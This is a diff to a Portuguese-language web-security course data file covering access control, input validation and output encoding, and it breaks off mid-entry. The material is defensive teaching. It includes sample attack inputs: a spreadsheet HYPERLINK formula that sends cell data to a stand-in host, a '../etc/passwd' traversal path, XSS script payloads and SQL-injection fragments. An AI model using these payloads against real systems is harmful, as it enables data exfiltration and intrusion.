+                  "}",
+                  "",
+                  "async function preview(raw, { fetch, resolve }) {",
+                  "  let url = raw;",
+                  "  for (let hop = 0; hop < 4; hop++) {",
+                  "    await checkUrl(url, resolve);",
+                  "    const res = await fetch(url, { redirect: \"manual\", signal: AbortSignal.timeout(5000) });",
+                  "    if ([301, 302, 303, 307, 308].includes(res.status)) { url = new URL(res.headers.location, url).href; continue; }",
+                  "    const html = (await res.text()).slice(0, 200_000);   // lê no máximo ~200 KB",
+                  "    return { title: /<title>([^<]*)<\\/title>/i.exec(html)?.[1] ?? null };",
+                  "  }",
+                  "  throw new Error(\"redirecionamentos demais\");",
+                  "}",
+                  "",
+                  "const resolve = async (host) => ({ \"blog.example.test\": [\"93.184.216.34\"], \"localhost\": [\"127.0.0.1\"] })[host] ?? [];",
+                  "const fetch = async (url) => ({ status: 200, text: async () => `<title>Página de ${new URL(url).hostname}</title>` });",
+                  "",
+                  "await preview(\"https://blog.example.test/post\", { fetch, resolve });                             // { title: \"Página de blog.example.test\" }",
+                  "await preview(\"http://localhost:9000/admin\", { fetch, resolve }).catch((e) => e.message);        // \"só https\"",
+                  "await preview(\"https://localhost:9000/admin\", { fetch, resolve }).catch((e) => e.message);       // \"destino não permitido\"",
+                ].join("\n"),
+              },
+              explanation:
+                "A pré-visualização continua funcionando para páginas públicas, e os destinos internos são recusados " +
+                "antes de qualquer conexão, inclusive quando alcançados por redirecionamento. O limite de tempo e de " +
+                "tamanho evita que uma URL lenta ou enorme prenda o servidor. Em produção, a conexão deve ir ao IP " +
+                "verificado, e o recurso pode rodar numa rede isolada.",
+            },
+          },
+        }),
         concept({
           order: 70,
           title: "Broken Access Control",
           requires: ["Authorization / Resource Ownership"],
           note: "IDOR — revisita Authorization / Resource Ownership",
           revisit: ["Platform / Authorization / Resource Ownership"],
+          summary:
+            "A categoria de falhas em que alguém consegue fazer o que não deveria: acessar dados de outras pessoas " +
+            "trocando um id (IDOR), usar funções administrativas, alterar campos protegidos pelo corpo da requisição " +
+            "ou chegar a arquivos fora da pasta permitida.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Controle de acesso quebrado é a categoria que lidera o Top 10 da OWASP. Ela reúne falhas diferentes com " +
+                "a mesma causa: o servidor não confere, em algum caminho, se quem pede pode fazer aquilo. As mais comuns " +
+                "são o IDOR (referência direta insegura a objeto: trocar `/orders/41` por `/orders/42` e ver o pedido de " +
+                "outra pessoa), a escalada vertical (um usuário comum usando uma rota administrativa), a atribuição em " +
+                "massa (enviar `\"role\": \"admin\"` no corpo e o servidor gravar tudo o que veio) e o path traversal (usar " +
+                "`../` num nome de arquivo para sair da pasta permitida).",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Todo caminho que acessa um recurso ou executa uma ação precisa de uma verificação no servidor — do dono, " +
+                "da permissão, dos campos que podem ser alterados, da pasta que pode ser lida —, e a ausência de qualquer " +
+                "uma delas é a falha.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "mass-assignment.js",
+              code: [
+                "// Atribuição em massa: o corpo inteiro é gravado no usuário",
+                "const users = new Map([[7, { id: 7, name: \"Ana\", email: \"ana@example.test\", role: \"member\", plan: \"free\" }]]);",
+                "",
+                "function updateProfileWrong(userId, body) {",
+                "  Object.assign(users.get(userId), body);   // grava qualquer campo que vier",
+                "}",
+                "",
+                "updateProfileWrong(7, { name: \"Ana Souza\", role: \"admin\", plan: \"enterprise\" });",
+                "users.get(7).role;   // \"admin\" — elevação de privilégio com um campo a mais no JSON",
+                "",
+                "// Correção: só os campos que esta rota pode alterar",
+                "const EDITABLE = [\"name\", \"email\"];",
+                "function updateProfile(userId, body) {",
+                "  const changes = Object.fromEntries(EDITABLE.filter((field) => field in body).map((field) => [field, body[field]]));",
+                "  Object.assign(users.get(userId), changes);",
+                "  return changes;",
+                "}",
+                "",
+                "users.get(7).role = \"member\";",
+                "updateProfile(7, { name: \"Ana S.\", role: \"admin\" });   // { name: \"Ana S.\" }",
+                "users.get(7).role;                                      // \"member\"",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "A lista de campos editáveis é uma allowlist: um campo novo no modelo, como `isVerified`, não fica " +
+                "editável por acidente. ORMs e frameworks costumam oferecer a mesma ideia (campos permitidos, DTOs de " +
+                "entrada).",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Filtro pelo dono ou pelo tenant em toda busca por id, como mostrado em Resource Ownership, e testes automatizados que tentam acessar recursos de outro usuário.",
+                "Allowlist de campos em toda rota que grava dados vindos do corpo da requisição.",
+                "Verificação de papel ou permissão em todas as rotas administrativas, no servidor, e não só na navegação da interface.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Ids aleatórios (UUID) dificultam adivinhar recursos, mas não substituem a verificação: ids vazam em URLs, logs e e-mails.",
+                "Esconder rotas (\"ninguém sabe que /admin/export existe\") não é controle de acesso; rotas são descobertas pelo código do front-end e por varredura.",
+                "Controle feito só na interface ou só no gateway deixa aberto qualquer caminho que o contorne, como uma rota interna, um job ou uma API antiga.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Path traversal: `../` num nome de arquivo",
+              context: "Um nome de arquivo vindo da requisição pode apontar para fora da pasta permitida.",
+              code: {
+                language: "javascript",
+                filename: "path-traversal.js",
+                code: [
+                  "import { resolve, sep } from \"node:path\";",
+                  "",
+                  "const BASE = resolve(\"/srv/app/uploads\");",
+                  "",
+                  "// Vulnerável: /download?file=../../../etc/passwd",
+                  "const pathWrong = (file) => `${BASE}/${file}`;",
+                  "",
+                  "// Seguro: resolve o caminho e confere que ele continua dentro da pasta",
+                  "function safePath(file) {",
+                  "  const full = resolve(BASE, file);",
+                  "  if (!full.startsWith(BASE + sep)) throw new Error(\"caminho fora da pasta permitida\");",
+                  "  return full;",
+                  "}",
+                  "",
+                  "safePath(\"recibo-42.pdf\");                              // \"/srv/app/uploads/recibo-42.pdf\"",
+                  "try { safePath(\"../../../etc/passwd\"); } catch (error) { error.message; }   // \"caminho fora da pasta permitida\"",
+                ].join("\n"),
+              },
+              explanation:
+                "O `resolve` interpreta os `..` e produz o caminho real; só então a comparação com a pasta base é " +
+                "confiável. Comparar o texto antes de resolver, ou remover `../` com um replace, é contornável. Melhor " +
+                "ainda é não usar o nome vindo do usuário: guardar os arquivos por um id e buscar o caminho no banco, já " +
+                "filtrado pelo dono.",
+            },
+            {
+              title: "A rota administrativa sem checagem",
+              context: "O menu esconde a opção; a rota continua aceitando qualquer usuário logado.",
+              code: {
+                language: "javascript",
+                filename: "vertical.js",
+                code: [
+                  "// Errado: autenticação sim, autorização não",
+                  "function exportAllUsersWrong(req) {",
+                  "  if (!req.user) return { status: 401 };",
+                  "  return { status: 200, body: \"id,email\\n...\" };   // qualquer logado exporta a base inteira",
+                  "}",
+                  "",
+                  "// Certo: a permissão é conferida na própria rota",
+                  "function exportAllUsers(req) {",
+                  "  if (!req.user) return { status: 401 };",
+                  "  if (!req.user.permissions.includes(\"users:export\")) return { status: 403 };",
+                  "  return { status: 200, body: \"id,email\\n...\" };",
+                  "}",
+                  "",
+                  "exportAllUsersWrong({ user: { permissions: [] } }).status;   // 200",
+                  "exportAllUsers({ user: { permissions: [] } }).status;        // 403",
+                ].join("\n"),
+              },
+              explanation:
+                "A escalada vertical costuma aparecer em rotas criadas para o painel administrativo, testadas só com " +
+                "contas de administrador. Um teste que chama cada rota administrativa com um usuário comum e espera 403 " +
+                "pega essa falha antes de chegar à produção.",
+            },
+            {
+              title: "Um teste que tenta o acesso cruzado",
+              context: "A melhor defesa contra IDOR é um teste que tenta acessar o recurso de outra pessoa.",
+              code: {
+                language: "javascript",
+                filename: "idor.test.js",
+                code: [
+                  "import { test } from \"node:test\";",
+                  "import assert from \"node:assert/strict\";",
+                  "",
+                  "// Função de rota em teste: busca um pedido pelo id, filtrando pelo cliente da sessão",
+                  "const orders = new Map([[41, { id: 41, customerId: 7 }], [42, { id: 42, customerId: 8 }]]);",
+                  "const getOrder = (req) => {",
+                  "  const order = orders.get(Number(req.params.id));",
+                  "  return order && order.customerId === req.user.id ? { status: 200, body: order } : { status: 404 };",
+                  "};",
+                  "",
+                  "test(\"um cliente não vê o pedido de outro\", () => {",
+                  "  assert.equal(getOrder({ user: { id: 7 }, params: { id: \"41\" } }).status, 200);",
+                  "  assert.equal(getOrder({ user: { id: 7 }, params: { id: \"42\" } }).status, 404);",
+                  "});",
+                ].join("\n"),
+              },
+              explanation:
+                "Testes de autorização descrevem o que cada pessoa não deve conseguir fazer, algo que testes de " +
+                "funcionalidade, escritos com a conta \"certa\", nunca exercitam. Um par de usuários de teste, um para cada " +
+                "lado, cobre a maior parte dos casos de IDOR.",
+            },
+          ],
+          exercise: {
+            problem:
+              "A rota de atualizar um projeto recebe o id pela URL e o corpo em JSON, e faz `Object.assign(project, " +
+              "body)` depois de conferir que o usuário está logado. Um usuário conseguiu transferir para si o projeto " +
+              "de outra equipe, mudando `ownerId`.",
+            problemCode: {
+              language: "javascript",
+              filename: "projects.js",
+              code: [
+                "const projects = new Map([",
+                "  [\"p1\", { id: \"p1\", name: \"Site\", ownerId: 7, archived: false }],",
+                "  [\"p2\", { id: \"p2\", name: \"App\", ownerId: 8, archived: false }],",
+                "]);",
+                "",
+                "function updateProject(req) {",
+                "  if (!req.user) return { status: 401 };",
+                "  const project = projects.get(req.params.id);",
+                "  if (!project) return { status: 404 };",
+                "  Object.assign(project, req.body);",
+                "  return { status: 200, body: project };",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Corrija as duas falhas: só o dono pode alterar o projeto (404 para os outros) e só os campos `name` e " +
+              "`archived` podem ser alterados. Mostre as duas tentativas de ataque falhando.",
+            hint:
+              "Confira `project.ownerId === req.user.id` antes de tudo; depois, copie do corpo apenas os campos " +
+              "permitidos.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "projects.fixed.js",
+                code: [
+                  "const EDITABLE = [\"name\", \"archived\"];",
+                  "",
+                  "function updateProject(req) {",
+                  "  if (!req.user) return { status: 401 };",
+                  "  const project = projects.get(req.params.id);",
+                  "  if (!project || project.ownerId !== req.user.id) return { status: 404 };   // IDOR",
+                  "  for (const field of EDITABLE) if (field in req.body) project[field] = req.body[field];   // atribuição em massa",
+                  "  return { status: 200, body: project };",
+                  "}",
+                  "",
+                  "updateProject({ user: { id: 7 }, params: { id: \"p2\" }, body: { name: \"meu agora\" } }).status;   // 404",
+                  "updateProject({ user: { id: 7 }, params: { id: \"p1\" }, body: { name: \"Site novo\", ownerId: 9 } }).body;",
+                  "// { id: \"p1\", name: \"Site novo\", ownerId: 7, archived: false } — ownerId ignorado",
+                ].join("\n"),
+              },
+              explanation:
+                "Eram duas falhas de controle de acesso na mesma rota: não conferir de quem era o projeto (IDOR) e " +
+                "aceitar qualquer campo (atribuição em massa). Transferir a propriedade é uma ação legítima, mas merece " +
+                "uma rota própria, com as suas regras e o seu registro de auditoria.",
+            },
+          },
         }),
         concept({
           order: 80,
           title: "Input Validation",
           note: "canônico — allowlist na fronteira, defesa contra entrada inválida/maliciosa. API Fundamentals / Request Validation trata o mesmo tema no contexto de contrato/request (conceitos distintos, pointer)",
           collision: "≠ API Fundamentals / Request Validation — segurança × validação de contrato",
+          summary:
+            "Conferir, na fronteira do sistema, que toda entrada tem a forma esperada — tipo, tamanho, formato e " +
+            "valores permitidos —, recusando o resto, como uma das camadas de defesa contra entradas maliciosas, sem " +
+            "substituir as defesas específicas de cada saída.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Do ponto de vista da segurança, validar entradas é reduzir a superfície de ataque: tudo o que entra por " +
+                "uma fronteira de confiança (requisições, arquivos enviados, mensagens de filas, respostas de APIs de " +
+                "terceiros) deve ter a forma mais restrita possível antes de seguir. A regra é a lista de permitidos " +
+                "(allowlist): descrever o que é aceito — um id é um inteiro positivo, um CEP tem 8 dígitos, um status é " +
+                "um de três valores — e recusar o resto, em vez de tentar listar o que é perigoso. A validação de " +
+                "contrato da API cuida da clareza para quem consome; aqui, o foco é o que um atacante pode tentar enviar.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Valide com allowlists, na fronteira e depois de normalizar a entrada — mas trate a validação como uma " +
+                "camada a mais: o que protege contra injeção e XSS é a forma correta de usar o dado na saída (parâmetros, " +
+                "codificação), e não a validação da entrada.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "validate.js",
+              code: [
+                "// Validação por allowlist: forma, tamanho e valores permitidos",
+                "const SHIPPING = new Set([\"standard\", \"express\", \"pickup\"]);",
+                "",
+                "function validateOrderInput(input) {",
+                "  const errors = [];",
+                "  const productId = Number(input.productId);",
+                "  if (!Number.isSafeInteger(productId) || productId <= 0) errors.push(\"productId: inteiro positivo\");",
+                "  const quantity = Number(input.quantity);",
+                "  if (!Number.isInteger(quantity) || quantity < 1 || quantity > 20) errors.push(\"quantity: de 1 a 20\");",
+                "  if (!SHIPPING.has(input.shipping)) errors.push(\"shipping: standard, express ou pickup\");",
+                "  const zip = String(input.zip ?? \"\").replace(/\\D/g, \"\");",
+                "  if (!/^\\d{8}$/.test(zip)) errors.push(\"zip: 8 dígitos\");",
+                "  const note = String(input.note ?? \"\");",
+                "  if (note.length > 500) errors.push(\"note: no máximo 500 caracteres\");",
+                "  return errors.length ? { ok: false, errors } : { ok: true, value: { productId, quantity, shipping: input.shipping, zip, note } };",
+                "}",
+                "",
+                "validateOrderInput({ productId: \"12\", quantity: \"2\", shipping: \"express\", zip: \"01310-100\", note: \"\" }).ok;   // true",
+                "validateOrderInput({ productId: \"12 OR 1=1\", quantity: 999, shipping: \"drone\", zip: \"abc\" }).errors.length;   // 4",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "O resultado da validação é um valor novo, com os tipos certos (`productId` número, `zip` só com " +
+                "dígitos), e é ele que segue para o resto do código — e não a entrada original. O campo de observação, " +
+                "texto livre, só tem o tamanho limitado: a proteção dele vem da forma como será exibido.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Em toda fronteira de confiança: requisições, uploads, mensagens de filas, arquivos importados e respostas de serviços de terceiros.",
+                "Com limites de tamanho em tudo — corpo da requisição, strings, listas, arquivos —, o que também protege contra negação de serviço.",
+                "Para uploads, conferindo o tipo pelo conteúdo do arquivo (os primeiros bytes), e não pela extensão nem pelo `Content-Type` enviado.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Validação não substitui parâmetros em SQL nem codificação na saída: um nome como `O'Brien` é válido e ainda assim quebra uma consulta concatenada.",
+                "Listas de bloqueio (\"recusar se contiver `<script>`\") são contornadas por outras grafias; descreva o que é permitido.",
+                "Expressões regulares mal escritas podem travar o servidor com entradas preparadas (ReDoS); prefira padrões simples, sem repetições aninhadas, e limite o tamanho antes.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Normalizar antes de validar",
+              context: "A mesma entrada pode ter várias grafias, e a validação precisa ver a forma final.",
+              code: {
+                language: "javascript",
+                filename: "canonicalize.js",
+                code: [
+                  "// Um nome de usuário que parece \"admin\", com letras de outro alfabeto",
+                  "const lookalike = \"аdmin\";   // o primeiro caractere é o \"а\" cirílico (U+0430)",
+                  "lookalike === \"admin\";                               // false",
+                  "[...lookalike].map((c) => c.codePointAt(0).toString(16));   // [\"430\", \"64\", \"6d\", \"69\", \"6e\"]",
+                  "",
+                  "// Allowlist de caracteres depois de normalizar a forma Unicode",
+                  "const USERNAME = /^[a-z0-9_]{3,20}$/;",
+                  "const validUsername = (raw) => USERNAME.test(raw.normalize(\"NFKC\").toLowerCase());",
+                  "",
+                  "validUsername(\"Ana_Souza\");   // true",
+                  "validUsername(lookalike);     // false — fora do alfabeto permitido",
+                ].join("\n"),
+              },
+              explanation:
+                "Sem normalização e sem allowlist de caracteres, é possível registrar nomes visualmente idênticos aos de " +
+                "outras contas, o que abre espaço para golpes. Normalizar primeiro (Unicode, maiúsculas, espaços) garante " +
+                "que a validação e as comparações seguintes vejam a mesma forma.",
+            },
+            {
+              title: "ReDoS: a expressão regular que trava o servidor",
+              context:
+                "Repetições aninhadas levam o motor de regex a testar um número de caminhos que cresce exponencialmente.",
+              code: {
+                language: "javascript",
+                filename: "redos.js",
+                code: [
+                  "import { performance } from \"node:perf_hooks\";",
+                  "",
+                  "const evil = /^(a+)+$/;          // repetição dentro de repetição",
+                  "const safe = /^a+$/;             // mesma linguagem, sem aninhamento",
+                  "",
+                  "function timeMs(regex, input) {",
+                  "  const start = performance.now();",
+                  "  regex.test(input);",
+                  "  return performance.now() - start;",
+                  "}",
+                  "",
+                  "// Entradas que quase casam: \"aaaa...a!\" — o \"!\" final força o motor a tentar todas as divisões",
+                  "[20, 22, 24].map((n) => Math.round(timeMs(evil, \"a\".repeat(n) + \"!\")));",
+                  "// ex.: [7, 29, 120] (ms) — cerca de 4× mais lento a cada 2 letras; os números variam por máquina",
+                  "",
+                  "// 25 caracteres na expressão perigosa custam mais que 100 mil na segura",
+                  "timeMs(evil, \"a\".repeat(25) + \"!\") > timeMs(safe, \"a\".repeat(100_000) + \"!\");   // true",
+                ].join("\n"),
+              },
+              explanation:
+                "Com poucas dezenas de caracteres, a expressão com `(a+)+` já leva segundos, e o Node, com uma thread de " +
+                "JavaScript, fica parado para todas as requisições. Limitar o tamanho da entrada antes da regex e evitar " +
+                "repetições aninhadas (ou usar motores lineares, como o RE2) elimina o problema.",
+            },
+            {
+              title: "O tipo do arquivo está nos bytes, e não no nome",
+              context: "Extensão e `Content-Type` são escolhidos por quem envia.",
+              code: {
+                language: "javascript",
+                filename: "magic-bytes.js",
+                code: [
+                  "const SIGNATURES = {",
+                  "  \"image/png\": [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a],",
+                  "  \"image/jpeg\": [0xff, 0xd8, 0xff],",
+                  "};",
+                  "",
+                  "function detectImageType(bytes) {",
+                  "  for (const [type, signature] of Object.entries(SIGNATURES)) {",
+                  "    if (signature.every((byte, i) => bytes[i] === byte)) return type;",
+                  "  }",
+                  "  return null;",
+                  "}",
+                  "",
+                  "const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);",
+                  "const htmlDisguised = Buffer.from(\"<html><script>alert(1)</script>\");   // enviado como \"foto.png\"",
+                  "",
+                  "detectImageType(png);             // \"image/png\"",
+                  "detectImageType(htmlDisguised);   // null — recusado, qualquer que seja o nome do arquivo",
+                ].join("\n"),
+              },
+              explanation:
+                "Um HTML com script enviado como `foto.png` e servido pelo próprio domínio vira um XSS armazenado. " +
+                "Conferir a assinatura dos primeiros bytes, servir os arquivos com um `Content-Type` fixo e " +
+                "`X-Content-Type-Options: nosniff`, e de preferência a partir de outro domínio, fecha esse caminho.",
+            },
+          ],
+          exercise: {
+            problem:
+              "A rota de busca aceita `page`, `pageSize` e `tags` pela query string sem nenhuma validação. Uma " +
+              "requisição com `pageSize=1000000` derrubou o banco, e `tags` chega às vezes como texto e às vezes como " +
+              "lista.",
+            problemCode: {
+              language: "javascript",
+              filename: "search-params.js",
+              code: [
+                "function parseSearch(query) {",
+                "  return { page: query.page, pageSize: query.pageSize, tags: query.tags };",
+                "}",
+                "",
+                "// Exemplos que já chegaram:",
+                "// { page: \"2\", pageSize: \"20\", tags: \"café\" }",
+                "// { page: \"-1\", pageSize: \"1000000\", tags: [\"a\", \"b\", ...5000 itens] }",
+                "// { page: \"1e3\", pageSize: \"20; DROP TABLE\", tags: \"<b>x</b>\" }",
+              ].join("\n"),
+            },
+            task:
+              "Escreva `parseSearch` com allowlist: `page` inteiro de 1 a 1000 (padrão 1), `pageSize` inteiro de 1 a " +
+              "100 (padrão 20), `tags` sempre uma lista de no máximo 10 itens, cada um com letras, números e hífen, até " +
+              "30 caracteres. Entradas fora da regra devem ser recusadas com a lista de erros.",
+            hint: "Converta e confira cada campo separadamente; normalize `tags` para lista antes de validar os itens.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "search-params.fixed.js",
+                code: [
+                  "const TAG = /^[\\p{L}\\p{N}-]{1,30}$/u;",
+                  "",
+                  "function intInRange(raw, { min, max, fallback }) {",
+                  "  if (raw === undefined || raw === \"\") return fallback;",
+                  "  if (!/^\\d{1,7}$/.test(String(raw))) return null;",
+                  "  const n = Number(raw);",
+                  "  return n >= min && n <= max ? n : null;",
+                  "}",
+                  "",
+                  "function parseSearch(query) {",
+                  "  const errors = [];",
+                  "  const page = intInRange(query.page, { min: 1, max: 1000, fallback: 1 });",
+                  "  if (page === null) errors.push(\"page: inteiro de 1 a 1000\");",
+                  "  const pageSize = intInRange(query.pageSize, { min: 1, max: 100, fallback: 20 });",
+                  "  if (pageSize === null) errors.push(\"pageSize: inteiro de 1 a 100\");",
+                  "  const tags = query.tags === undefined ? [] : [].concat(query.tags).map((t) => String(t).normalize(\"NFKC\"));",
+                  "  if (tags.length > 10) errors.push(\"tags: no máximo 10\");",
+                  "  else if (!tags.every((t) => TAG.test(t))) errors.push(\"tags: letras, números e hífen, até 30 caracteres\");",
+                  "  return errors.length ? { ok: false, errors } : { ok: true, value: { page, pageSize, tags } };",
+                  "}",
+                  "",
+                  "parseSearch({ page: \"2\", pageSize: \"20\", tags: \"café\" });",
+                  "// { ok: true, value: { page: 2, pageSize: 20, tags: [\"café\"] } }",
+                  "parseSearch({ page: \"-1\", pageSize: \"1000000\", tags: Array(5000).fill(\"a\") }).errors;",
+                  "// [\"page: inteiro de 1 a 1000\", \"pageSize: inteiro de 1 a 100\", \"tags: no máximo 10\"]",
+                  "parseSearch({ page: \"1e3\", pageSize: \"20; DROP TABLE\", tags: \"<b>x</b>\" }).errors.length;   // 3",
+                ].join("\n"),
+              },
+              explanation:
+                "Cada campo passou a ter forma e limites explícitos, e o resto do código recebe números e uma lista, " +
+                "nunca o texto cru. O limite de `pageSize` é o que protege o banco; a validação das tags reduz o que pode " +
+                "chegar à consulta e à tela, sem dispensar os parâmetros e a codificação na saída.",
+            },
+          },
         }),
-        concept({ order: 90, title: "Output Encoding", requires: ["Cross-Site Scripting (XSS)"], note: "encoding contextual (HTML/attr/JS/URL)" }),
-        concept({ order: 100, title: "Content Security Policy (CSP)", requires: ["Cross-Site Scripting (XSS)", "Web Fundamentals / HTTP Headers"], note: "defesa em profundidade contra XSS; nonce/hash" }),
-        concept({ order: 110, title: "Security Headers", requires: ["Web Fundamentals / HTTP Headers"], note: "HSTS, X-Content-Type-Options, frame-ancestors, Referrer-Policy" }),
+        concept({
+          order: 90,
+          title: "Output Encoding",
+          requires: ["Cross-Site Scripting (XSS)"],
+          note: "encoding contextual (HTML/attr/JS/URL)",
+          summary:
+            "Transformar os dados no momento em que são colocados numa saída — HTML, atributo, JavaScript, URL, CSS — " +
+            "com a codificação própria daquele contexto, para que sejam sempre interpretados como dado e nunca como " +
+            "parte da estrutura.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Codificação de saída é a defesa principal contra XSS e outras injeções na apresentação. O ponto " +
+                "essencial é o contexto: o mesmo texto precisa de tratamentos diferentes conforme onde ele entra. No " +
+                "conteúdo de um elemento HTML, basta trocar `<`, `>` e `&` por entidades; num atributo, também as aspas; " +
+                "dentro de um `<script>`, a regra é outra (serializar como JSON e escapar `<`); num parâmetro de URL, " +
+                "usa-se a codificação percentual. Aplicar a codificação de um contexto em outro dá uma falsa sensação de " +
+                "segurança.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Codifique na saída, pelo contexto em que o dado entra — e deixe esse trabalho para o mecanismo de " +
+                "templates ou o framework sempre que possível, porque eles escolhem a codificação certa de forma " +
+                "automática e consistente.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "contextual.js",
+              code: [
+                "const htmlText = (s) => String(s).replace(/[&<>]/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\" })[c]);",
+                "const htmlAttr = (s) => String(s).replace(/[&<>\"']/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" })[c]);",
+                "// Dentro de <script>: JSON, com \"<\" escapado para que \"</script>\" não feche a tag antes da hora",
+                "const jsValue = (v) => JSON.stringify(v).replace(/</g, \"\\\\u003c\").replace(/\\u2028/g, \"\\\\u2028\").replace(/\\u2029/g, \"\\\\u2029\");",
+                "const urlParam = (s) => encodeURIComponent(s);",
+                "",
+                "const name = `Ana \"</script><script>alert(1)</script>`;",
+                "",
+                "`<p>Olá, ${htmlText(name)}</p>`;",
+                "`<input value=\"${htmlAttr(name)}\">`;",
+                "`<script>const user = ${jsValue({ name })};</script>`;",
+                "`<a href=\"/busca?q=${urlParam(name)}\">buscar</a>`;",
+                "",
+                "jsValue({ name }).includes(\"</script>\");   // false — a tag não fecha antes da hora",
+                "urlParam(\"café & pão\");                   // \"caf%C3%A9%20%26%20p%C3%A3o\"",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "Os quatro valores são o mesmo nome, e cada um sai de um jeito. A função de atributo só funciona com o " +
+                "atributo entre aspas; em atributos de evento (`onclick`) e em `href`, nenhuma codificação de HTML " +
+                "resolve, e a regra é não colocar dados de fora ali (ou validar o esquema da URL).",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Em toda saída que inclui dados de fora: páginas HTML, e-mails em HTML, respostas que viram parte de outra linguagem (CSV, XML, comandos).",
+                "Pelo mecanismo de templates ou framework com escape automático, reservando as funções manuais para casos pontuais e revisados.",
+                "Também em saídas que parecem inofensivas, como arquivos CSV abertos em planilhas, que interpretam células começadas por `=`.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Codificar na entrada, antes de gravar, estraga os dados para outros usos (buscas, APIs, relatórios) e leva a dupla codificação na tela.",
+                "Codificação não resolve contextos perigosos por natureza: dentro de `eval`, de `setTimeout` com string ou de atributos de evento, dados de fora não devem entrar.",
+                "Quando é preciso aceitar HTML do usuário, a codificação apagaria a formatação; a saída ali é a sanitização com uma biblioteca, e não o escape.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "O escape de HTML no lugar errado",
+              context: "Escapar para HTML não protege um valor colocado dentro de JavaScript.",
+              code: {
+                language: "javascript",
+                filename: "wrong-context.js",
+                code: [
+                  "const htmlText = (s) => String(s).replace(/[&<>]/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\" })[c]);",
+                  "",
+                  "const search = \"'; alert(document.domain); '\";",
+                  "",
+                  "// Escapado para HTML, mas colocado dentro de uma string JavaScript:",
+                  "const page = `<script>const term = '${htmlText(search)}';</script>`;",
+                  "page;   // \"<script>const term = ''; alert(document.domain); '';</script>\" — o código roda",
+                  "",
+                  "// Certo: serializar como JSON para o contexto JavaScript",
+                  "const pageOk = `<script>const term = ${JSON.stringify(search).replace(/</g, \"\\\\u003c\")};</script>`;",
+                  "pageOk;   // \"<script>const term = \\\"'; alert(document.domain); '\\\";</script>\" — só uma string",
+                ].join("\n"),
+              },
+              explanation:
+                "O escape de HTML não mexe em apóstrofos soltos dentro de uma string de script, e o valor fecha a string " +
+                "e injeta código. Cada contexto tem a sua gramática, e a codificação precisa ser a dessa gramática.",
+            },
+            {
+              title: "Injeção em CSV aberto numa planilha",
+              context: "Uma célula que começa com `=` é uma fórmula para o Excel e o LibreOffice.",
+              code: {
+                language: "javascript",
+                filename: "csv-injection.js",
+                code: [
+                  "// Nome de usuário escolhido por um atacante, exportado num relatório CSV",
+                  "const name = '=HYPERLINK(\"https://evil.test/?d=\"&A2,\"Clique aqui\")';",
+                  "",
+                  "function csvCell(value) {",
+                  "  let text = String(value);",
+                  "  if (/^[=+\\-@\\t\\r]/.test(text)) text = `'${text}`;   // neutraliza fórmulas: vira texto na planilha",
+                  "  return `\"${text.replace(/\"/g, '\"\"')}\"`;             // aspas duplicadas: regra do próprio CSV",
+                  "}",
+                  "",
+                  "csvCell(name);         // \"\\\"'=HYPERLINK(\\\"\\\"https://evil.test/?d=\\\"\\\"&A2,\\\"\\\"Clique aqui\\\"\\\")\\\"\"",
+                  "csvCell(\"Ana Souza\");  // \"\\\"Ana Souza\\\"\"",
+                ].join("\n"),
+              },
+              explanation:
+                "O CSV em si é só texto, mas a planilha que o abre interpreta fórmulas, que podem vazar dados de outras " +
+                "células ou induzir quem abre a clicar. O apóstrofo inicial é a forma aceita pelas planilhas de dizer " +
+                "\"isto é texto\", e as aspas duplicadas seguem a regra do formato.",
+            },
+            {
+              title: "O framework escapa, até a porta de saída",
+              context: "Em React, o escape é automático, e a exceção tem um nome que avisa.",
+              code: {
+                language: "javascript",
+                filename: "react.jsx",
+                code: [
+                  "function Comment({ comment }) {",
+                  "  return (",
+                  "    <li>",
+                  "      <strong>{comment.author}</strong>   {/* escapado automaticamente */}",
+                  "      <p>{comment.text}</p>               {/* escapado automaticamente */}",
+                  "      <a href={comment.website}>site</a>  {/* NÃO protege contra \"javascript:\": validar o esquema */}",
+                  "      <div dangerouslySetInnerHTML={{ __html: comment.html }} />   {/* só com HTML sanitizado */}",
+                  "    </li>",
+                  "  );",
+                  "}",
+                ].join("\n"),
+              },
+              explanation:
